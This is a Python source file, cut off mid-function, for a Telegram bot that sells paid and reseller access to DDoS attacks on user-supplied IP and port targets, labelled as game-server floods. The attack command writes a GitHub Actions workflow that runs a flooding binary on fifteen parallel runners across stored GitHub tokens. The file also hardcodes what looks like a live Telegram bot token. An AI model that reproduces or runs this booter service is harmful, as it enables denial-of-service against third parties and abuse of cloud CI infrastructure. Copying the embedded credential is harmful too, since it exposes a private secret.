import os
import json
import logging
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler
from github import Github, GithubException

from keep_alive import keep_alive
keep_alive()

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8499935979:AAEnf4tWEWwCRDjoYuRajH9KZR54FREAvVU"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "soul"
# ADMIN_IDS = [521756472, 7733336238,7772881209] 
ADMIN_IDS = [6761752864]
OWNER_IDS = [6820056931]

WAITING_FOR_BINARY = 1
WAITING_FOR_BROADCAST = 2
WAITING_FOR_OWNER_ADD = 3
WAITING_FOR_OWNER_DELETE = 4
WAITING_FOR_RESELLER_ADD = 5
WAITING_FOR_RESELLER_REMOVE = 6


current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 5
MAINTENANCE_MODE = False
MAX_ATTACKS = 40
user_attack_counts = {}  

USER_PRICES = {
    "1": 120,
    "2": 240,
    "3": 360,
    "4": 450,
    "7": 650
}

RESELLER_PRICES = {
    "1": 150,
    "2": 250,
    "3": 300,
    "4": 400,
    "7": 550
}


def load_users():
    try:
        with open('users.json', 'r') as f:
            users_data = json.load(f)
            if not users_data:
                initial_users = ADMIN_IDS.copy()
                save_users(initial_users)
                return set(initial_users)
            return set(users_data)
    except FileNotFoundError:
        initial_users = ADMIN_IDS.copy()
        save_users(initial_users)
        return set(initial_users)

def save_users(users):
    with open('users.json', 'w') as f:
        json.dump(list(users), f)

def load_pending_users():
    try:
        with open('pending_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_pending_users(pending_users):
    with open('pending_users.json', 'w') as f:
        json.dump(pending_users, f, indent=2)

def load_approved_users():
    try:
        with open('approved_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_approved_users(approved_users):
    with open('approved_users.json', 'w') as f:
        json.dump(approved_users, f, indent=2)

def load_owners():
    try:
        with open('owners.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        owners = {}
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {
                "username": f"owner_{admin_id}",
                "added_by": "system",
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "is_primary": True
            }
        save_owners(owners)
        return owners

def save_owners(owners):
    with open('owners.json', 'w') as f:
        json.dump(owners, f, indent=2)

def load_admins():
    try:
        with open('admins.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_admins(admins):
    with open('admins.json', 'w') as f:
        json.dump(admins, f, indent=2)

def load_groups():
    try:
        with open('groups.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_groups(groups):
    with open('groups.json', 'w') as f:
        json.dump(groups, f, indent=2)

def load_resellers():
    try:
        with open('resellers.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_resellers(resellers):
    with open('resellers.json', 'w') as f:
        json.dump(resellers, f, indent=2)

def load_github_tokens():
    try:
        with open('github_tokens.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_github_tokens(tokens):
    with open('github_tokens.json', 'w') as f:
        json.dump(tokens, f, indent=2)

def load_attack_state():
    try:
        with open('attack_state.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {"current_attack": None, "cooldown_until": 0}

def save_attack_state():
    state = {
        "current_attack": current_attack,
        "cooldown_until": cooldown_until
    }
    with open('attack_state.json', 'w') as f:
        json.dump(state, f, indent=2)

def load_maintenance_mode():
    try:
        with open('maintenance.json', 'r') as f:
            data = json.load(f)
            return data.get("maintenance", False)
    except FileNotFoundError:
        return False

def save_maintenance_mode(mode):
    with open('maintenance.json', 'w') as f:
        json.dump({"maintenance": mode}, f, indent=2)

def load_cooldown():
    try:
        with open('cooldown.json', 'r') as f:
            data = json.load(f)
            return data.get("cooldown", 5)
    except FileNotFoundError:
        return 60

def save_cooldown(duration):
    with open('cooldown.json', 'w') as f:
        json.dump({"cooldown": duration}, f, indent=2)

def load_max_attacks():
    try:
        with open('max_attacks.json', 'r') as f:
            data = json.load(f)
            return data.get("max_attacks", 1)
    except FileNotFoundError:
        return 1

def save_max_attacks(max_attacks):
    with open('max_attacks.json', 'w') as f:
        json.dump({"max_attacks": max_attacks}, f, indent=2)

def load_trial_keys():
    try:
        with open('trial_keys.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_trial_keys(keys):
    with open('trial_keys.json', 'w') as f:
        json.dump(keys, f, indent=2)

def load_user_attack_counts():
    try:
        with open('user_attack_counts.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_user_attack_counts(counts):
    with open('user_attack_counts.json', 'w') as f:
        json.dump(counts, f, indent=2)


authorized_users = load_users()
pending_users = load_pending_users()
approved_users = load_approved_users()
owners = load_owners()
admins = load_admins()
groups = load_groups()
resellers = load_resellers()
github_tokens = load_github_tokens()
MAINTENANCE_MODE = load_maintenance_mode()
COOLDOWN_DURATION = load_cooldown()
MAX_ATTACKS = load_max_attacks()
user_attack_counts = load_user_attack_counts()
trial_keys = load_trial_keys()

attack_state = load_attack_state()
current_attack = attack_state.get("current_attack")
cooldown_until = attack_state.get("cooldown_until", 0)


def is_primary_owner(user_id):
    user_id_str = str(user_id)
    if user_id_str in owners:
        return owners[user_id_str].get("is_primary", False)
    return False

def is_owner(user_id):
    return str(user_id) in owners

def is_admin(user_id):
    return str(user_id) in admins

def is_reseller(user_id):
    return str(user_id) in resellers

def is_approved_user(user_id):
    user_id_str = str(user_id)
    if user_id_str in approved_users:
        expiry_timestamp = approved_users[user_id_str]['expiry']
        if expiry_timestamp == "LIFETIME":
            return True
        current_time = time.time()
        if current_time < expiry_timestamp:
            return True
        else:
            
            del approved_users[user_id_str]
            save_approved_users(approved_users)
    return False

def can_user_attack(user_id):
    return (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)) and not MAINTENANCE_MODE
# def can_user_attack(user_id):
#     return (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)) and not MAINTENANCE_MODE

def can_start_attack(user_id):
    global current_attack, cooldown_until
    
    if MAINTENANCE_MODE:
        return False, "⚠️ **ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ**\n━━━━━━━━━━━━━━━━━━━━━━\nʙᴏᴛ ɪs ᴜɴᴅᴇʀ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ."
    
    
    user_id_str = str(user_id)
    current_count = user_attack_counts.get(user_id_str, 0)
    if current_count >= MAX_ATTACKS:
        return False, f"⚠️ **ᴍᴀxɪᴍᴜᴍ ᴀᴛᴛᴀᴄᴋ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ**\n━━━━━━━━━━━━━━━━━━━━━━\nʏᴏᴜ ʜᴀᴠᴇ ᴜsᴇᴅ ᴀʟʟ {MAX_ATTACKS} ᴀᴛᴛᴀᴄᴋ(s). ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ ғᴏʀ ᴍᴏʀᴇ."
    
    if current_attack is not None:
        return False, "⚠️ **ᴇʀʀᴏʀ: ᴀᴛᴛᴀᴄᴋ ᴀʟʀᴇᴀᴅʏ ʀᴜɴɴɪɴɢ**\n━━━━━━━━━━━━━━━━━━━━━━\nᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ᴜɴᴛɪʟ ᴛʜᴇ ᴄᴜʀʀᴇɴᴛ ᴀᴛᴛᴀᴄᴋ ғɪɴɪsʜᴇs ᴏʀ 40 sᴇᴄᴏɴᴅs ᴄᴏᴏʟᴅᴏᴡɴ."
    
    current_time = time.time()
    if current_time < cooldown_until:
        remaining_time = int(cooldown_until - current_time)
        return False, f"⏳ **ᴄᴏᴏʟᴅᴏᴡɴ ʀᴇᴍᴀɪɴɪɴɢ**\n━━━━━━━━━━━━━━━━━━━━━━\nᴘʟᴇᴀsᴇ ᴡᴀɪᴛ `{remaining_time}` sᴇᴄᴏɴᴅs ʙᴇғᴏʀᴇ sᴛᴀʀᴛɪɴɢ ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ."
    
    return True, "✅ ʀᴇᴀᴅʏ ᴛᴏ sᴛᴀʀᴛ ᴀᴛᴛᴀᴄᴋ"

def get_attack_method(ip):
    if ip.startswith('91'):
        return "VC FLOOD", "ɢᴀᴍᴇ"
    elif ip.startswith(('99', '96')):
        return None, "⚠️ ɪɴᴠᴀʟɪᴅ ɪᴘ - ɪᴘs sᴛᴀʀᴛɪɴɢ ᴡɪᴛʜ '99' ᴏʀ '96' ᴀʀᴇ ɴᴏᴛ ᴀʟʟᴏᴡᴇᴅ"
    else:
        return "BGMI FLOOD", "ɢᴀᴍᴇ"

def is_valid_ip(ip):
    return not ip.startswith(('99', '96'))

def start_attack(ip, port, time_val, user_id, method):
    global current_attack
    current_attack = {
        "ip": ip,
        "port": port,
        "time": time_val,
        "user_id": user_id,
        "method": method,
        "start_time": time.time(),
        "estimated_end_time": time.time() + int(time_val)
    }
    save_attack_state()
    
    
    user_id_str = str(user_id)
    user_attack_counts[user_id_str] = user_attack_counts.get(user_id_str, 0) + 1
    save_user_attack_counts(user_attack_counts)

def finish_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def stop_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def get_attack_status():
    global current_attack, cooldown_until
    
    if current_attack is not None:
        current_time = time.time()
        elapsed = int(current_time - current_attack['start_time'])
        remaining = max(0, int(current_attack['estimated_end_time'] - current_time))
        
        return {
            "status": "running",
            "attack": current_attack,
            "elapsed": elapsed,
            "remaining": remaining
        }
    
    current_time = time.time()
    if current_time < cooldown_until:
        remaining_cooldown = int(cooldown_until - current_time)
        return {
            "status": "cooldown",
            "remaining_cooldown": remaining_cooldown
        }
    
    return {"status": "ready"}


def generate_trial_key(hours):
    
    key = f"TRL-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}"
    
    
    expiry = time.time() + (hours * 3600)  
    
    
    trial_keys[key] = {
        "hours": hours,
        "expiry": expiry,
        "used": False,
        "used_by": None,
        "created_at": time.time(),
        "created_by": "system"
    }
    save_trial_keys(trial_keys)
    
    return key

def redeem_trial_key(key, user_id):
    user_id_str = str(user_id)
    
    if key not in trial_keys:
        return False, "ɪɴᴠᴀʟɪᴅ ᴋᴇʏ"
    
    key_data = trial_keys[key]
    
    if key_data["used"]:
        return False, "ᴋᴇʏ ᴀʟʀᴇᴀᴅʏ ᴜsᴇᴅ"
    
    if time.time() > key_data["expiry"]:
        return False, "ᴋᴇʏ ᴇxᴘɪʀᴇᴅ"
    
    
    key_data["used"] = True
    key_data["used_by"] = user_id_str
    key_data["used_at"] = time.time()
    trial_keys[key] = key_data
    save_trial_keys(trial_keys)
    
    
    expiry = time.time() + (key_data["hours"] * 3600)
    approved_users[user_id_str] = {
        "username": f"user_{user_id}",
        "added_by": "trial_key",
        "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "expiry": expiry,
        "days": key_data["hours"] / 24,
        "trial": True
    }
    save_approved_users(approved_users)
    
    return True, f"✅ ᴛʀɪᴀʟ ᴀᴄᴄᴇss ᴀᴄᴛɪᴠᴀᴛᴇᴅ ғᴏʀ {key_data['hours']} ʜᴏᴜʀs!"


def create_repository(token, repo_name="soulcrack-tg"):
    try:
        g = Github(token)
        user = g.get_user()
        
        try:
            repo = user.get_repo(repo_name)
            return repo, False
        except GithubException:
            repo = user.create_repo(
                repo_name,
                description="SOULCRACK DDOS Bot Repository",
                private=False,
                auto_init=False
            )
            return repo, True
    except Exception as e:
        raise Exception(f"Failed to create repository: {e}")

def update_yml_file(token, repo_name, ip, port, time_val, method):
    yml_content = f"""name: soul Attack
on: [push]

jobs:
  soul:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10,
            11,12,13,14,15]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x soul
    - run: sudo ./soul {ip} {port} {time_val}
"""
    
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        
        try:
            file_content = repo.get_contents(YML_FILE_PATH)
            repo.update_file(
                YML_FILE_PATH,
                f"Update attack parameters - {ip}:{port} ({method})",
                yml_content,
                file_content.sha
            )
            logger.info(f"✅ Updated configuration for {repo_name}")
        except:
            repo.create_file(
                YML_FILE_PATH,
                f"Create attack parameters - {ip}:{port} ({method})",
                yml_content
            )
            logger.info(f"✅ Created configuration for {repo_name}")
        
        return True
    except Exception as e:
        logger.error(f"❌ Error for {repo_name}: {e}")
        return False

def instant_stop_all_jobs(token, repo_name):
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        
        running_statuses = ['queued', 'in_progress', 'pending']
        total_cancelled = 0
        
        for status in running_statuses:
            try:
                workflows = repo.get_workflow_runs(status=status)
                for workflow in workflows:
                    try:
                        workflow.cancel()
                        total_cancelled += 1
                        logger.info(f"✅ INSTANT STOP: Cancelled {status} workflow {workflow.id} for {repo_name}")
                    except Exception as e:
                        logger.error(f"❌ Error cancelling workflow {workflow.id}: {e}")
            except Exception as e:
                logger.error(f"❌ Error getting {status} workflows: {e}")
        
        return total_cancelled
        
    except Exception as e:
        logger.error(f"❌ Error accessing {repo_name}: {e}")
        return 0


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if MAINTENANCE_MODE and not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "🔧 **ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ʙᴏᴛ ɪs ᴜɴᴅᴇʀ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ.\n"
            "ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ᴜɴᴛɪʟ ɪᴛ's ʙᴀᴄᴋ."
        )
        return
    
    if not can_user_attack(user_id):
        user_exists = False
        for user in pending_users:
            if str(user['user_id']) == str(user_id):
                user_exists = True
                break
        
        if not user_exists:
            pending_users.append({
                "user_id": user_id,
                "username": update.effective_user.username or f"user_{user_id}",
                "request_date": time.strftime("%Y-%m-%d %H:%M:%S")
            })
            save_pending_users(pending_users)
            
            
            for owner_id in owners.keys():
                try:
                    await context.bot.send_message(
                        chat_id=int(owner_id),
                        text=f"📥 **ɴᴇᴡ ᴀᴄᴄᴇss ʀᴇǫᴜᴇsᴛ**\n━━━━━━━━━━━━━━━━━━━━━━\nᴜsᴇʀ: @{update.effective_user.username or 'No username'}\nɪᴅ: `{user_id}`\nᴜsᴇ /add {user_id} 7 ᴛᴏ ᴀᴘᴘʀᴏᴠᴇ"
                    )
                except:
                    pass
        
        await update.message.reply_text(
            "📋 **ᴀᴄᴄᴇss ʀᴇǫᴜᴇsᴛ sᴇɴᴛ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ʏᴏᴜʀ ᴀᴄᴄᴇss ʀᴇǫᴜᴇsᴛ ʜᴀs ʙᴇᴇɴ sᴇɴᴛ ᴛᴏ ᴀᴅᴍɪɴ.\n"
            "ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ᴀᴘᴘʀᴏᴠᴀʟ.\n\n"
            "ᴜsᴇ /id ᴛᴏ ɢᴇᴛ ʏᴏᴜʀ ᴜsᴇʀ ɪᴅ\n"
            "ᴜsᴇ /help ғᴏʀ ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅs\n\n"
            "💡 **ᴡᴀɴᴛ ᴀ ᴛʀɪᴀʟ?**\n"
            "ᴀsᴋ ᴀᴅᴍɪɴ ғᴏʀ ᴀ ᴛʀɪᴀʟ ᴋᴇʏ ᴏʀ ʀᴇᴅᴇᴇᴍ ᴏɴᴇ ᴡɪᴛʜ /redeem <ᴋᴇʏ>"
        )
        return
    
    attack_status = get_attack_status()
    
    if attack_status["status"] == "running":
        attack = attack_status["attack"]
        await update.message.reply_text(
            "🔥 **ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 ᴛᴀʀɢᴇᴛ: `{attack['ip']}:{attack['port']}`\n"
            f"⏱️ ᴇʟᴀᴘsᴇᴅ: `{attack_status['elapsed']}s`\n"
            f"⏳ ʀᴇᴍᴀɪɴɪɴɢ: `{attack_status['remaining']}s`"
        )
        return
    
    if attack_status["status"] == "cooldown":
        await update.message.reply_text(
            "⏳ **ᴄᴏᴏʟᴅᴏᴡɴ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ `{attack_status['remaining_cooldown']}s`\n"
            "ʙᴇғᴏʀᴇ sᴛᴀʀᴛɪɴɢ ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ."
        )
        return
    
    
    if is_owner(user_id):
        if is_primary_owner(user_id):
            user_role = "👑 ᴘʀɪᴍᴀʀʏ ᴏᴡɴᴇʀ"
        else:
            user_role = "👑 ᴏᴡɴᴇʀ"
    elif is_admin(user_id):
        user_role = "🛡️ ᴀᴅᴍɪɴ"
    elif is_reseller(user_id):
        user_role = "💰 ʀᴇsᴇʟʟᴇʀ"
    else:
        user_role = "👤 ᴀᴘᴘʀᴏᴠᴇᴅ ᴜsᴇʀ"
    
    
    user_id_str = str(user_id)
    current_attacks = 0
    remaining_attacks = MAX_ATTACKS - current_attacks
    
    await update.message.reply_text(
        f"🤖 **ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ʙᴏᴛ** 🤖\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{user_role}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🎯 **ʀᴇᴍᴀɪɴɪɴɢ ᴀᴛᴛᴀᴄᴋs:** {remaining_attacks}/{MAX_ATTACKS}\n\n"
        "📋 **ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅs:**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "• /attack <ɪᴘ> <ᴘᴏʀᴛ> <ᴛɪᴍᴇ> - sᴛᴀʀᴛ ᴀᴛᴛᴀᴄᴋ\n"
        "• /status - ᴄʜᴇᴄᴋ ᴀᴛᴛᴀᴄᴋ sᴛᴀᴛᴜs\n"
        "• /stop - sᴛᴏᴘ ᴀʟʟ ᴀᴛᴛᴀᴄᴋs\n"
        "• /id - ɢᴇᴛ ʏᴏᴜʀ ᴜsᴇʀ ɪᴅ\n"
        "• /myaccess - ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴀᴄᴄᴇss\n"
        "• /help - sʜᴏᴡ ʜᴇʟᴘ\n"
        "• /redeem <ᴋᴇʏ> - ʀᴇᴅᴇᴇᴍ ᴛʀɪᴀʟ ᴋᴇʏ\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📢 **ɴᴏᴛᴇs:**\n"
        f"• ᴏɴʟʏ ᴏɴᴇ ᴀᴛᴛᴀᴄᴋ ᴀᴛ ᴀ ᴛɪᴍᴇ\n"
        f"• 60s ᴄᴏᴏʟᴅᴏᴡɴ ᴀғᴛᴇʀ ᴀᴛᴛᴀᴄᴋ\n"
        f"• ɪɴᴠᴀʟɪᴅ ɪᴘs: '99', '96'"
    )


async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not can_user_attack(user_id):
        await update.message.reply_text("❌ ʏᴏᴜ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴀᴄᴄᴇss ᴛᴏ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.")
        return

    if len(context.args) != 3:
        await update.message.reply_text("💡 **ᴜsᴀɢᴇ:** /attack <ɪᴘ> <ᴘᴏʀᴛ> <ᴛɪᴍᴇ>")
        return

    ip = context.args[0]
    port = context.args[1]
    time_val = context.args[2]

    
    if not is_valid_ip(ip):
        await update.message.reply_text(f"⚠️ **ɪɴᴠᴀʟɪᴅ ɪᴘ**\n━━━━━━━━━━━━━━━━━━━━━━\nɪᴘs sᴛᴀʀᴛɪɴɢ ᴡɪᴛʜ '99' ᴏʀ '96' ᴀʀᴇ ɴᴏᴛ ᴀʟʟᴏᴡᴇᴅ.")
        return

    try:
        time_int = int(time_val)
        if time_int > 300:
            await update.message.reply_text("⚠️ **ᴍᴀx ᴛɪᴍᴇ ʟɪᴍɪᴛ**\n━━━━━━━━━━━━━━━━━━━━━━\nᴍᴀxɪᴍᴜᴍ ᴀᴛᴛᴀᴄᴋ ᴛɪᴍᴇ ɪs 300 sᴇᴄᴏɴᴅs.")
            return
    except ValueError:
        await update.message.reply_text("❌ ᴛɪᴍᴇ ᴍᴜsᴛ ʙᴇ ᴀ ɴᴜᴍʙᴇʀ.")
        return

    can_start, message = can_start_attack(user_id)
    if not can_start:
        await update.message.reply_text(message)
        return

    method, method_type = get_attack_method(ip)
    
    if method is None:
        await update.message.reply_text(method_type)
        return

    
    if not github_tokens:
        await update.message.reply_text("❌ ɴᴏ ɢɪᴛʜᴜʙ ᴛᴏᴋᴇɴs ᴀᴠᴀɪʟᴀʙʟᴇ. ᴘʟᴇᴀsᴇ ᴀᴅᴅ ᴀ ᴛᴏᴋᴇɴ ғɪʀsᴛ.")
        return

    
    start_attack(ip, port, time_val, user_id, method)
    
    status_msg = await update.message.reply_text(
        f"🚀 **ᴀᴛᴛᴀᴄᴋ sᴇɴᴛ sᴜᴄᴄᴇssғᴜʟʟʏ!**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 **ᴛᴀʀɢᴇᴛ:** `{ip}:{port}`\n"
        f"⏱️ **ᴛɪᴍᴇ:** `{time_val}s`\n"
        f"💉 **ᴍᴇᴛʜᴏᴅ:** `{method}`\n"
        f"🎮 **ᴛʏᴘᴇ:** `{method_type}`\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "⏳ **ᴘʀᴏᴄᴇssɪɴɢ ᴀᴛᴛᴀᴄᴋ...**"
    )

    
    def run_attack():
        success_count = 0
        for token_info in github_tokens:
            token = token_info['token']
            username = token_info['username']
            repo_name = token_info['repo']
            
            if update_yml_file(token, repo_name, ip, port, time_val, method):
                success_count += 1
        
        
        time.sleep(int(time_val))
        finish_attack()
        
        
        context.application.create_task(
            status_msg.edit_text(
                f"✅ **ᴀᴛᴛᴀᴄᴋ ғɪɴɪsʜᴇᴅ!**\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🌐 **ᴛᴀʀɢᴇᴛ:** `{ip}:{port}`\n"
                f"⏱️ **ᴛɪᴍᴇ:** `{time_val}s`\n"
                f"💉 **ᴍᴇᴛʜᴏᴅ:** `{method}`\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"⏳ **ᴄᴏᴏʟᴅᴏᴡɴ sᴛᴀʀᴛᴇᴅ: {COOLDOWN_DURATION}s**"
            )
        )

    threading.Thread(target=run_attack).start()


async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not (is_owner(user_id) or is_admin(user_id) or is_approved_user(user_id)):
        await update.message.reply_text("❌ ɴᴏ ᴀᴄᴄᴇss.")
        return

    if not github_tokens:
        await update.message.reply_text("❌ ɴᴏ ᴛᴏᴋᴇɴs.")
        return

    msg = await update.message.reply_text("🛑 **sᴛᴏᴘᴘɪɴɢ ᴀʟʟ ᴀᴛᴛᴀᴄᴋs...**")
    
    total_cancelled = 0
    for token_info in github_tokens:
        cancelled = instant_stop_all_jobs(token_info['token'], token_info['repo'])
        total_cancelled += cancelled
    
    stop_attack()
    await msg.edit_text(f"✅ **ᴀʟʟ ᴀᴛᴛᴀᴄᴋs sᴛᴏᴘᴘᴇᴅ!**\n━━━━━━━━━━━━━━━━━━━━━━\nᴛᴏᴛᴀʟ ᴊᴏʙs ᴋɪʟʟᴇᴅ: `{total_cancelled}`")


async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    attack_status = get_attack_status()
    
    if attack_status["status"] == "running":
        attack = attack_status["attack"]
        await update.message.reply_text(
            "🔥 **ᴀᴛᴛᴀᴄᴋ sᴛᴀᴛᴜs: ʀᴜɴɴɪɴɢ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 ᴛᴀʀɢᴇᴛ: `{attack['ip']}:{attack['port']}`\n"
            f"💉 ᴍᴇᴛʜᴏᴅ: `{attack['method']}`\n"
            f"⏱️ ᴇʟᴀᴘsᴇᴅ: `{attack_status['elapsed']}s`\n"
            f"⏳ ʀᴇᴍᴀɪɴɪɴɢ: `{attack_status['remaining']}s`"
        )
    elif attack_status["status"] == "cooldown":
        await update.message.reply_text(
            "⏳ **ᴀᴛᴛᴀᴄᴋ sᴛᴀᴛᴜs: ᴄᴏᴏʟᴅᴏᴡɴ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ `{attack_status['remaining_cooldown']}s` ʙᴇғᴏʀᴇ ɴᴇxᴛ ᴀᴛᴛᴀᴄᴋ."
        )
    else:
        await update.message.reply_text(
            "✅ **ᴀᴛᴛᴀᴄᴋ sᴛᴀᴛᴜs: ʀᴇᴀᴅʏ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ɴᴏ ᴀᴛᴛᴀᴄᴋ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ʀᴜɴɴɪɴɢ."
        )


async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await update.message.reply_text(f"🆔 **ʏᴏᴜʀ ᴛᴇʟᴇɢʀᴀᴍ ɪᴅ:** `{user_id}`")


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    help_text = (
        "❓ **ʜᴇʟᴘ & ᴄᴏᴍᴍᴀɴᴅs**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "👤 **ᴜsᴇʀ ᴄᴏᴍᴍᴀɴᴅs:**\n"
        "• /attack <ɪᴘ> <ᴘᴏʀᴛ> <ᴛɪᴍᴇ> - sᴛᴀʀᴛ ᴀᴛᴛᴀᴄᴋ\n"
        "• /status - ᴄʜᴇᴄᴋ sᴛᴀᴛᴜs\n"
        "• /id - ɢᴇᴛ ʏᴏᴜʀ ɪᴅ\n"
        "• /myaccess - ᴄʜᴇᴄᴋ ᴀᴄᴄᴇss\n"
        "• /redeem <ᴋᴇʏ> - ʀᴇᴅᴇᴇᴍ ᴛʀɪᴀʟ ᴋᴇʏ\n\n"
    )
    
    if is_owner(user_id) or is_admin(user_id):
        help_text += (
            "🛡️ **ᴀᴅᴍɪɴ ᴄᴏᴍᴍᴀɴᴅs:**\n"
            "• /add <ɪᴅ> <ᴅᴀʏs> - ᴀᴅᴅ ᴜsᴇʀ\n"
            "• /remove <ɪᴅ> - ʀᴇᴍᴏᴠᴇ ᴜsᴇʀ\n"
            "• /users - ʟɪsᴛ ᴀᴘᴘʀᴏᴠᴇᴅ ᴜsᴇʀs\n"
            "• /pending - ʟɪsᴛ ʀᴇǫᴜᴇsᴛs\n"
            "• /stop - sᴛᴏᴘ ᴀʟʟ ᴀᴛᴛᴀᴄᴋs\n"
            "• /broadcast <ᴍsɢ> - sᴇɴᴅ ᴛᴏ ᴀʟʟ\n"
            "• /genkey <ʜᴏᴜʀs> - ᴄʀᴇᴀᴛᴇ ᴛʀɪᴀʟ ᴋᴇʏ\n"
            "• /keys - ʟɪsᴛ ᴀʟʟ ᴋᴇʏs\n"
            "• /maintenance <on/off> - ᴛᴏɢɢʟᴇ ᴍᴏᴅᴇ\n"
            "• /setcooldown <sᴇᴄs> - sᴇᴛ ᴄᴏᴏʟᴅᴏᴡɴ\n"
            "• /setmaxattacks <ɴᴜᴍ> - sᴇᴛ ᴍᴀx ᴀᴛᴛᴀᴄᴋs\n"
            "• /resetattacks - ʀᴇsᴇᴛ ᴀʟʟ ᴄᴏᴜɴᴛs\n\n"
        )
    
    if is_owner(user_id):
        help_text += (
            "👑 **ᴏᴡɴᴇʀ ᴄᴏᴍᴍᴀɴᴅs:**\n"
            "• /addowner <ɪᴅ> - ᴀᴅᴅ ɴᴇᴡ ᴏᴡɴᴇʀ\n"
            "• /deleteowner <ɪᴅ> - ʀᴇᴍᴏᴠᴇ ᴏᴡɴᴇʀ\n"
            "• /addadmin <ɪᴅ> - ᴀᴅᴅ ᴀᴅᴍɪɴ\n"
            "• /removeadmin <ɪᴅ> - ʀᴇᴍᴏᴠᴇ ᴀᴅᴍɪɴ\n"
            "• /addreseller <ɪᴅ> - ᴀᴅᴅ ʀᴇsᴇʟʟᴇʀ\n"
            "• /removereseller <ɪᴅ> - ʀᴇᴍᴏᴠᴇ ʀᴇsᴇʟʟᴇʀ\n"
            "• /addtoken <ᴛᴏᴋᴇɴ> <ʀᴇᴘᴏ> - ᴀᴅᴅ ɢɪᴛʜᴜʙ\n"
            "• /tokens - sʜᴏᴡ ɢɪᴛʜᴜʙ ᴛᴏᴋᴇɴs\n"
